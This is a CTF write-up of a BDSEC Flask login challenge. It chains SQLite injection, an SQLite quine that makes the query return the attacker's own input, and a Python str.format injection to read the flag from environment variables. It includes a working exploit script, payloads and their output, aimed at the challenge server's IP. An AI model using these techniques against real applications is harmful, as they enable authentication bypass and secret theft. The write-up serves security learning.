
## challenge description
![Screenshot_20230724_204209](https://github.com/kiro6/writeups-ctfs/assets/57776872/fbaa0c1b-6b0f-4001-afff-2d9c3290675c)

## first lets explore 

#### there is a login page 
![Screenshot_20230724_204347](https://github.com/kiro6/writeups-ctfs/assets/57776872/4b68ea40-5330-4d45-adc4-041ac8704aef)

#### we have the source code lets take a look 
```python 
from flask import Flask, request , render_template
import textwrap
import sqlite3
import os
import hashlib
os.environ['FLAG'] ='test{flag}'

app = Flask(__name__)


@app.route('/login', methods=['POST' , 'GET'])
def root_data():
    data = request.form

    if 'username' not in data or 'password' not in data:
        error = 'Please Enter Both username and password'
        return render_template('index.html' , error = error)

    con = sqlite3.connect(':memory:')
    cur = con.cursor()
    cur.execute('CREATE TABLE users (username TEXT, password TEXT)')
    cur.execute(
        'INSERT INTO users VALUES ("admin", ?)',
        [hashlib.md5(os.environ['FLAG'].encode()).hexdigest()]
    )
    output = cur.execute(
        'SELECT * FROM users WHERE username = {data[username]!r} AND password = {data[password]!r}'
        .format(data=data)
    ).fetchone()

    if output is None:
        error = "Ups! Wrong Creds!"
        return render_template('index.html' , error = error)

    username, password = output
    if username != data["username"] or password != data["password"]:
        error = 'You cant Hack Uss!!!'
        return render_template('index.html' , error = error)

    return f'Yooo!! {data["username"]}!'.format(data=data)


@app.route('/', methods=['GET'])
def root_get():
    return render_template('index.html')
    
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=7777 , debug=False)
```

#### breakdown for the code 

- the code take a username and password from endpoint login 
- it stores the parameters in data variable then checks if both of them were given  
- creates  sqlite database with table called users contain username and password
- create only one user which is admin and hash the flag env variable to be the password
- create a query from our input username and password using `!r format specifier` => looks like we found something here
- check if the output of the query != null if it is null send `Ups! Wrong Creds!`
- store the output from the query in username and password variables
- check if the result username and password from the query equals the values which is given in the parameters  if not send `You cant Hack Uss!!!`  => so normal sql bypass will not work 
- finally if passed all it sends back the username => looks like template injection 

#### it seems to have a SQL injection and template injection so lets try to find our way in 


### SQL phase

##### if we tried to make SQL bypass we will see the `Ups! Wrong Creds!` message after trying a lot of payload it always the same result 
![Screenshot_20230724_210709](https://github.com/kiro6/writeups-ctfs/assets/57776872/f48819ff-4b8f-484e-a93a-b49407da3403)

##### it seem that our payload is being escaped if we tried to inject `'"` it will raise a server error , so lets back to the source code and start our local instance to understand what is happening 

##### in this part of code where the query is being constructed is uses `!r format specifier`
```python
    output = cur.execute(
        'SELECT * FROM users WHERE username = {data[username]!r} AND password = {data[password]!r}'
        .format(data=data)
    ).fetchone()
```

##### the behavior of `!r format` is in escaping chars is interesting
```python
>>> print("aaa {test!r} bbb".format(test="hello"))  
aaa 'hello' bbb
#surrounds test variable with single quotes

print("aaa {test!r} bbb".format(test="hello'"))    
aaa "hello'" bbb
#surrounds test variable with double quotes when there is a single quotes in the value

>>> print("aaa {test!r} bbb".format(test="hello\""))  
aaa 'hello"' bbb
#surrounds test variable with single quotes when there is a double quotes in the value

print("aaa {test!r} bbb".format(test="hello'\""))  
aaa 'hello\'"' bbb
#surrounds test variable with single quotes when there is a double quotes and single quotes in the value and escape the single quote with backslash
```

##### so our SQL query is turned to something like this
```sql
username="' or 1=1 -- -" AND password = test
```

##### that is why the `Ups! Wrong Creds!` message pop up because it surrounds the payload with either `'` or `"` depends on out input but why it triggered a server error when we used `'"`  although the payload will become like this  , the user name value is the single quote which is escaped (or not we will see) and double quote it should say `Ups! Wrong Creds!`
```sql 
username = '\'"' AND password = 'aa'
```

##### if we run the local instance we will find the error says 
```python
sqlite3.OperationalError: unrecognized token: ""' AND password = 'aa'"
```

##### it seems that the single quote is not escaped , if we checked how SQLite escape single quote  it will be by just two single quotes and the back-slash is treated as normal char
```
'' => escaped 
\' => not escaped
```

##### lets try to make a new SQLi payload 
![Screenshot_20230724_214859](https://github.com/kiro6/writeups-ctfs/assets/57776872/1642de99-3591-428e-92fe-9167c73698e5)

##### a new error means progress it actually worked we could bypass the first check if the query return none 

##### if we run our local instance and debugged to print the query will be like this 
```python
username = '"\' OR 1=1 -- -' AND password = 'aa'
```
##### the user name value will be `"\` and then use `or 1=1 -- -`  



##### OR we can inject it like this 
![Screenshot_20230724_234210](https://github.com/kiro6/writeups-ctfs/assets/57776872/ca7611bf-3096-47a9-85b4-d531de46a6df)

##### the query will be like this 
```python
username = '"\'' AND password = ' OR 1=1 -- -'
```
##### while SQLite make  `''` escaped  the username value is `"\'' AND password = ` and we can control the rest of the query 



##### at this point we can get the password of the admin which is the flag hashed but we do not need because we could not crack it  


### I actually stopped here in the challenge in the CTF time and the challenges were available after the CTF time with the help of other ctfers for two days i found the solution and learned alot

### Thanks to imnotfanta & 0xrobiul & badhacker0x1

### Quine phase

##### the code checks if the result from query is as same as what  is was given so normal SQL injection will not work we will need a SQL query will return a result (to bypass the first check )and the result to be as the same the our input (to bypass the second check )

##### that leads us to inserting topic which is Quine `In computer science, a quine is a self-replicating program—a program that can produce a copy of its own source code as its output`  we need a sqlite quine which return a result and the result is the query it self 

#### Example of SQLite quine is found in [SQLite Quine](https://github.com/makenowjust/quine/blob/main/quine.sql)
```sqlite
sqlite> select printf(s,s)from(select'select printf(s,s)from(select%Qas s);'as s);  
select printf(s,s)from(select'select printf(s,s)from(select%Qas s);'as s);
```

##### It seems complicated but it is not i will try to explain it 
```sqlite
sqlite> SELECT '%Qas s' AS s;  
%Qas s
```
This query simply selects the string `'%Qas s'` and gives it an alias `s`.

```sqlite 
sqlite> SELECT printf(s, s) FROM (SELECT '%Qas s' AS s);  
'%Qas s'as s
```
In this query, the `printf` function is used to format the string `s` with itself (`s, s`) , in simple terms the `%Q `is used for formatting queries and you have a string  `%Qas s` and `%Qas s` replace the first one in the place of  `%Q`   in the second one and it will produce the result  

use the same logic on the first payload and it will make sense 


### Another example is 
```sql
sqlite> SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Qui  
ne ;  
SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Quine  
```
it relies on the same logic 


#### using the help of [DUCTF SQLi Challenge Writeup](https://www.justinsteven.com/posts/2022/09/27/ductf-sqli2022/) 

```python
def quine(data):
    data = data.replace('$$', "REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)")
    blob = data.replace('$$', '"$"').replace("'", '"')
    data = data.replace('$$', "'" + blob + "'")
    print(data)
```

modify it to use `"`  instead of `'`
```python
def quine(data):
    data = data.replace('$$', "REPLACE(REPLACE(REPLACE($$,CHAR(39),CHAR(34)),CHAR(36),$$), CHAR(92), CHAR())")
    blob = data.replace("'", '"').replace('$$', "'$'")
    data = data.replace('$$', f'"{blob}"')
    return data
```

##### if we checked the code back we can see the result of the username value if our payload succeeded , so we will inject the password and if succeded we will see the value of our username ,  the payload will be something like
```python
username = testpayload"\'
```
```python
password = f'UNION SELECT CHAR({','.join(str(ord(c)) for c in username)}), $$;-- -'
```

Where `$$` should be `$password`, returning the `$password` itself.

```python
#!/usr/bin/env python3
import requests


def quine(data):
    data = data.replace('$$', "REPLACE(REPLACE(REPLACE($$,CHAR(39),CHAR(34)),CHAR(36),$$), CHAR(92), CHAR())")
    blob = data.replace("'", '"').replace('$$', "'$'")
    data = data.replace('$$', f'"{blob}"')
    return data


def exploit():

    payload = "testttt"
    username = envleak + "\"'"


    password = f" UNION SELECT CHAR({','.join(str(ord(c)) for c in username)}), $$;-- -"
    password = quine(password)


    r = requests.post(url="http://139.144.184.115:1337/login",
                      data={
                          "username": username,
                          "password": password
                      })


    print(r.text)


if __name__ == "__main__":
    exploit()
```

##### lets try our code 
```bash
python py2.py
Yooo!! testttt"'!
```
##### the query in the backend will look like 
```sqlite
SELECT * FROM users WHERE username = 'testtt"\'' AND password = ' UNION SELECT CHAR(116,101,115,116,116,116,34,39), REPLACE(REPLACE(REPLACE(" UNION SELECT CHAR(116,101,115,116,116,116,34,39), REPLACE(REPLACE(REPLACE(\'$\',CHAR(39),CHAR(34)),CHAR(36),\'$\'), CHAR(92), CHAR());-- -",CHAR(39),CHAR(34)),CHAR(36)," UNION SELECT CHAR(116,101,115,116,116,116,34,39), REPLACE(REPLACE(REPLACE(\'$\',CHAR(39),CHAR(34)),CHAR(36),\'$\'), CHAR(92), CHAR());-- -"), CHAR(92), CHAR());-- -'
```
##### the query result will be like 
```python
('testtt"\'', ' UNION SELECT CHAR(116,101,115,116,116,116,34,39), REPLACE(REPLACE(REPLACE(" UNION SELECT CHAR(116,101,115,116,116,116,34,39), REPLACE(REPLACE(REPLACE(\'$\',CHAR(39),CHAR(34)),CHAR(36),\'$\'), CHAR(92), CHAR());-- -",CHAR(39),CHAR(34)),CHAR(36)," UNION SELECT CHAR(116,101,115,116,116,116,34,39), REPLACE(REPLACE(REPLACE(\'$\',CHAR(39),CHAR(34)),CHAR(36),\'$\'), CHAR(92), CHAR());-- -"), CHAR(92), CHAR());-- -')
```


##### Great now we control the username output !!!



### Template Injection Phase

##### Using our code we will try to find a working SSTI working payload the goal is to get the OS module 

##### after i tried a lot of SSTI payload it seems non of them work but why ?
##### the answer in the code of course  , due using format we can only access the data variable so will construct our payload based on that
```python 
f'Yooo!! {data["username"]}!'.format(data=data)
```

##### using our code change the payload variable to contain the SSTI , Lets try 

```python
payload = '{data}'

python py2.py
Yooo!! ImmutableMultiDict([('username', '{data}"\''), ('password', ' UNION SELECT CHAR(123,100,97,116,97,125,34,39), REPLACE(REPLACE(REPLACE(" UNION SELECT CHAR(123,100,97,116,97,125,34,39), REPLACE(REPLACE(REPLACE(\'$\',CHAR(39),CHAR(34)),CHAR(36),\'$\'), CHAR(92), CHAR());-- -",CHAR(39),CHAR(34)),CHAR(36)," UNION SELECT CHAR(123,100,97,116,97,125,34,39), REPLACE(REPLACE(REPLACE(\'$\',CHAR(39),CHAR(34)),CHAR(36),\'$\'), CHAR(92), CHAR());-- -"), CHAR(92), CHAR());-- -')])"'!
```

##### okay it actually works , check global to find any useful modules or vars
```python
data.__init__.__globals__
```
#####  mimetypes module which import os  [mimetypes](https://github.com/python/cpython/blob/3.11/Lib/mimetypes.py) (was a hint actually)
```python
data.__init__.__globals__[mimetypes].os.environ[FLAG]
```

##### finally we get the flag !!!!!!
```python
python py2.py
Yooo!! BDSEC{f1nj3c710n5_4r3_p41nful}"'!
```
